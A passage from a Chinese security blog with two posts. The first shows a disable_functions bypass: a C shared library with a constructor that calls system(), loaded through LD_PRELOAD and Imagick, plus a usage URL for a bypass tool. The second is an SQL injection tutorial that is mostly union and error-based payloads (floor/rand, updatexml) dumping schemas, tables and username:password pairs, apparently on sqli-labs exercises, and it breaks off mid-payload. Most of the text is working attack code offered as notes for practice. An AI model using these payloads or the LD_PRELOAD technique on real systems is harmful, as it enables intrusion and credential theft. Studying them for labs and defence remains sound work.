<h5 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版 (hijack shared library)"></a>改进版 (hijack shared library)</h5><p>但其实这个方法是将条件变得严苛了，我们干的事情局限于找到一个函数，然后对其进行注入</p>
<p>但实际上我们可以更加直接，我们先将 sendmail 进行删除</p>
<p><a href="https://p4.ssl.qhimg.com/t011363df8d77bc765d.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t011363df8d77bc765d.png" alt="img"></a></p>
<p>如图所示现在已经没有了 sendmail，但我们依旧可以进行 rce，可使用如下文件 sky.c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">     unsetenv(&quot;LD_PRELOAD&quot;);  &#x2F;&#x2F;centos 上却无效</span><br><span class="line">    system(&quot;ls&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>__attribute__ ((__constructor__))</code> 有如下说明</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.It&#39;s run when a shared library is loaded, typically during program startup.</span><br><span class="line">2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.</span><br><span class="line">3.The destructor is run when the shared library is unloaded, typically at program exit.</span><br></pre></td></tr></table></figure>

<p>所以当我们最开始将 evil shared library load 上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们 rce 的目的.</p>
<p> 那么我们要找到一个什么样的函数才能满足我们的条件呢？ </p>
<p>​     php-imagick  </p>
<p><strong>readelf -Ws /usr/sbin/sendmail</strong></p>
<p>我们发现如下对应关系</p>
<p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png" target="_blank" rel="noopener"><img src="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png" alt="img"></a></p>
<p>我们发现当文件是 MPEG format 时，程序会调用’ffmpeg’ program 进行转换，而如下后缀都被认为成 MPEG format</p>
<p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png" alt="img"></a></p>
<p>我们测试一下.wmv</p>
<p>写出脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们测试一下</p>
<p> <code>strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve</code> 查看 Imagick () 是否启动新进程：</p>
<p><a href="https://image.3001.net/images/20181215/1544880349_5c1500dd492a1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181215/1544880349_5c1500dd492a1.png!small" alt="image.png"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [&#x2F;* 21 vars *&#x2F;]) &#x3D; 0</span><br><span class="line">[pid 25217] execve(&quot;&#x2F;bin&#x2F;sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;&#x2F;tmp&#x2F;magick-2&quot;...], [&#x2F;* 21 vars *&#x2F;]) &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>可以发现的确成功启动了子进程，调用了 ffmpeg</p>
<p>但是如果 sky.wmv 文件不存在时</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [&#x2F;* 21 vars *&#x2F;]) &#x3D; 0</span><br></pre></td></tr></table></figure>

<p>则不会调用 ffmpeg</p>
<p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p>
<p>所以如果想利用 Imagick 新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p>
<p> payload &amp; attack</p>
<p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造 evil shared library 了</p>
<p>我们还是用之前的 sky.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">angel</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    system(<span class="string">"ls"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编译一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC sky.c -o sky</span><br><span class="line">gcc --share sky -o sky.so</span><br></pre></td></tr></table></figure>

<p>测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./sky.so"</span>);</span><br><span class="line">$img = <span class="keyword">new</span> Imagick(<span class="string">'sky.wmv'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@sky:~# php sky.php</span><br><span class="line">bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.old</span><br><span class="line">PHP Fatal error:  Uncaught ImagickException: unable to open image &#96;&#x2F;tmp&#x2F;magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error&#x2F;blob.c&#x2F;OpenBlob&#x2F;2712 in &#x2F;root&#x2F;sky.php:3</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#x2F;root&#x2F;sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in &#x2F;root&#x2F;sky.php on line 3</span><br></pre></td></tr></table></figure>

<p>我们成功的进行了列目录</p>
<h5 id="unsetenv-centos-上无效"><a href="#unsetenv-centos-上无效" class="headerlink" title="unsetenv   centos 上无效"></a>unsetenv   centos 上无效</h5><p> <code>https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p> 一是 cmd 参数，待执行的系统命令（如 pwd）；二是 outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），在页面上显示，其他该参数，你应注意 web 是否有读写权限，网站是否可以跨目录访问，文件将被覆盖和删除等内容；三是 sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外，该 bypass_disablefunc.php 分解命令和输出路径成为完整的命令行，所以您不用在 cmd 参数中重新设置。 </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhiliya">
      <meta itemprop="description" content="emmmm 感觉没啥好说的">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zhiliya">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql注入</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-11-24 11:30:11" itemprop="dateCreated datePublished" datetime="2019-11-24T11:30:11+08:00">2019-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-09-26 11:31:07" itemprop="dateModified" datetime="2020-09-26T11:31:07+08:00">2020-09-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat(DISTINCT column_name)    与group by配合使用，添加distinct后，将不同的column_name连接起来</span><br></pre></td></tr></table></figure>



<p>接下来我们就要判断SQL语句的POC了。SQL常有三种POC：<br> (1)….where user_id = $id</p>
<p>(2)….where user_id = ‘$id’</p>
<p>(3)….where user_id = “$id” </p>
<p>抓到数据包后依然是先尝试确定 POC。首先将 id 的参数改为 <code>1 or 12=12</code> 发现数据包发送成功了，返回了多个值，说明数据库的 POC 为第一种。</p>
<p>我们尝试下 <code>1&#39; or &#39;12&#39;=&#39;12</code>，响应包显示失败。<code>1&quot; or &quot;12&quot;=&quot;12</code> 同理也是失败。 </p>
<p>1‘ #</p>
<p>’呢？那就会报错了。 报错mysql_query () 函数就会返回一个布尔值</p>
<p>因为 mysql_query () 函数会返回一个布尔值，在下行代码中 mysql_fetch_array ($sql) 将执行失败，并且 PHP 会显示一条警告信息，告诉我们 mysql_fetch_array () 的第一个参数必须是个资源，而代码在实际运行中，给出的参数值却是一个布尔值。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;   //创建test数据库</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;    </span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(username <span class="built_in">varchar</span>(<span class="number">8</span>), <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">32</span>));  //创建user表</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(username, <span class="keyword">password</span>) <span class="keyword">values</span>(<span class="string">'test'</span>,<span class="string">'123456'</span>);  //插入数据</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'cat'</span>=<span class="string">''</span> <span class="keyword">and</span> passwd = <span class="string">'cat'</span>=<span class="string">''</span>;  可成功执行</span><br></pre></td></tr></table></figure>

<img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/clip_image002.jpg" alt="img" style="zoom:150%;">



<h2 id="有回显和位-union联合注入"><a href="#有回显和位-union联合注入" class="headerlink" title="有回显和位 union联合注入"></a>有回显和位 union联合注入</h2><p>类似于</p>
<p>$sql=”SELECT * FROM users WHERE id=($id) LIMIT 0,1”;<br>$result=mysql_query($sql);<br>$row = mysql_fetch_array($result);</p>
<p>echo ‘Your Login name:’. $row[‘username’];</p>
<h4 id="获取字段显示位"><a href="#获取字段显示位" class="headerlink" title="获取字段显示位"></a><strong>获取字段显示位</strong></h4><p>在页面上会显示从 select 语句中选取的字段，通过以上方式 2 中的 <strong><em>union select 1,2,3…</em></strong> 可判断出具体显示字段的显示位</p>
<h4 id="通过显示位获取数据库信息"><a href="#通过显示位获取数据库信息" class="headerlink" title="通过显示位获取数据库信息"></a>通过显示位获取数据库信息</h4><p>1’ union select version(),@@version_compile_os #</p>
<p>1’ union select user(),database()#</p>
<p>1’ union all select user(),database()#</p>
<p>mysql：<br> \1. 判断版本 and ord (mid (version (),1,1))&gt;51 /* 返回正常说明是 4.0 以上版本，可以用 union 查询 </p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162559075.png" alt="image-20200724162559075"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜测是</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>select * from users where id=’<strong>1’–+</strong> limit 0,1</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">三种注释方式：</span><br><span class="line">1' or 1=1 <span class="comment">#</span></span><br><span class="line">1' or 1=1 <span class="comment">-- (末尾为空格)                 --+不就是--空格</span></span><br><span class="line">1' or 'abc'='abc</span><br></pre></td></tr></table></figure>

<p>列怎么来判断呢  用order by</p>
<p>select * from users where id=’<strong>1’ order by 3–+</strong> limit 0,1</p>
<p>select * from users where id=’<strong>1’ order by 4–+</strong> limit 0,1   到4就回显没有列4</p>
<p>or</p>
<p>select * from users where id=’<strong>-1’ union select 1,2 –+</strong> limit 0,1 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">union语句只能返回一条查询结果 前面必须构造为查询结果不存在 才能显示我们想要获取到的信息的那条</span><br><span class="line">获取数据库名</span><br><span class="line">select * from users where id&#x3D;&#39;</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ </span><br><span class="line">limit 0,1 </span><br><span class="line">数据库名security</span><br></pre></td></tr></table></figure>

<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p>select * from users where id=’<strong>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+</strong> limit 0,1 </p>
<p>or</p>
<p>select * from users where id=’<strong>-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security” –+</strong> limit 0,1 </p>
<h4 id="爆列-字段名"><a href="#爆列-字段名" class="headerlink" title="爆列(字段名)"></a>爆列(字段名)</h4><p>id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+  </p>
<p>admin’union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’b4bsql’#</p>
<h4 id="爆字段值"><a href="#爆字段值" class="headerlink" title="爆字段值"></a>爆字段值</h4><p>?id=-1’ union select 1,group_concat(concat_ws(‘:’,username,password)),3 from security.users–+</p>
<p>1’ union select 1,group_concat(concat_ws(‘–’,username,password)) from users #<br>1’ union select 1,group_concat(concat_ws(0x7c,username,password)) from users #</p>
<h2 id="无回显位-盲注"><a href="#无回显位-盲注" class="headerlink" title="无回显位 盲注"></a>无回显位 盲注</h2><h3 id="报错盲注"><a href="#报错盲注" class="headerlink" title="报错盲注"></a>报错盲注</h3><p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725194906580.png" alt="image-20200725194906580"></p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725194820898.png" alt="image-20200725194820898"></p>
<h4 id="floor-round-报错"><a href="#floor-round-报错" class="headerlink" title="floor(round)报错"></a>floor(round)报错</h4><p>  <code>floor(rand(0)*2)</code> 报错是有条件的，记录必须 3 条以上，而且在 3 条以上必定报错 </p>
<p> 一条记录的话 无论执行多少次也不报错。然后增加一条记录，两条记录的话 结果就变成不确定性了。 </p>
<p>原理方面可以看这篇文章：<a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/8472323.html</a></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()), <span class="string">'-'</span>, <span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a; </span><br><span class="line"><span class="comment">#将select database()换成你想要的东西</span></span><br><span class="line">&amp;username=test%00' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>),<span class="keyword">database</span>())x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a) ;%23</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">报错盲注</span><br><span class="line">            <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>(<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">'~'</span>, <span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)x;</span><br><span class="line">?id=2' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*), <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="keyword">floor</span> (<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a) <span class="comment">--+   提示输出信息超过一行，说明这里数据库名组成的字符串长度超过了64位(group_concat()函数最大长度为64位)，所以需要放弃group_concat()函数，而使用limit 0,1来一个个输出。</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">2</span><span class="string">' and (select 1 from (select count(*),concat((select schema_name             from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+ 为了方便查看，稍微改动语句</span></span><br><span class="line"><span class="string">?id=2'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(schema_name,<span class="string">';'</span>) <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span> (<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a)<span class="comment">--+   继续爆其他数据库名，改变limit n,1即可</span></span><br><span class="line">?id=2' and (select 1 from (select count(*),concat((select concat(schema_name,';') from information_schema.schemata limit 1,1),floor(rand()*2)) as x from information_schema.tables group by x) as a) --+</span><br><span class="line">爆security数据库中的表：</span><br><span class="line">?id=2' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(table_name,<span class="string">';'</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a) <span class="comment">--+ 还是更换limit n,1一个一个爆出。</span></span><br><span class="line">爆<span class="keyword">users</span>表的列名：</span><br><span class="line">?id=2' and (select 1 from (select count(*),concat((select concat(column_name,';') from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+</span><br><span class="line">爆users表中的内容:</span><br><span class="line">用户名和密码为，同样，limit n,1慢慢来吧：</span><br><span class="line">?id=2' and(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="string">': '</span>,<span class="keyword">password</span>,<span class="string">';'</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>()*<span class="number">2</span>)) <span class="keyword">as</span> x <span class="keyword">from</span> security.users <span class="keyword">group</span> <span class="keyword">by</span> x) <span class="keyword">as</span> a)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">现在我们准备加上<span class="keyword">Group</span> <span class="keyword">By</span> 语句了。</span><br><span class="line">我们使用information_schema.tables 或 information_schema.columns者两个表来查询。因为表里面一般数据很多。容易生成很多的随机值，不至于全部是security0，这样就不能查询出结果了。</span><br><span class="line">https://blog.csdn.net/Leep0rt/article/details/<span class="number">78556440</span></span><br><span class="line">双查询注入</span><br><span class="line">在此之前，我们理解一下子查询，查询的关键字是<span class="keyword">select</span>，这个大家都知道。子查询可以简单的理解在一个<span class="keyword">select</span>语句里还有一个<span class="keyword">select</span>。里面的这个<span class="keyword">select</span>语句就是子查询。</span><br><span class="line">看一个简单的例子：</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">database</span>()));</span><br><span class="line">真正执行的时候，先从子查询进行。因此执行<span class="keyword">select</span> <span class="keyword">database</span>() 这个语句就会把当前的数据库查出来，然后把结果传入到<span class="keyword">concat</span>函数。这个函数是用来连接的。比如 <span class="keyword">concat</span>(‘a’,’b’)那结果就是ab了。</span><br><span class="line"></span><br><span class="line"><span class="keyword">Less</span><span class="number">-05</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)as b)--+数据库名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a)b)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a,floor(rand(0)*2))as a from information_schema.columns group by a)b)--+</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------爆表名</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'emails'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))<span class="keyword">as</span> a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a)b)<span class="comment">--+</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------爆列名</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and (select 1 from (select count(*),concat(0x3a,0x3a,(select email_id from security.emails limit 2,1),0x3a,0x3a,floor(rand(0)*2))as a from information_schema.columns group by a)b)--+</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------爆字段值</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725101536916.png" alt></p>
<h4 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Less-06</span><br><span class="line">?id=1" and updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">--+  </span></span><br><span class="line">爆数据库名 <span class="keyword">or</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">" and 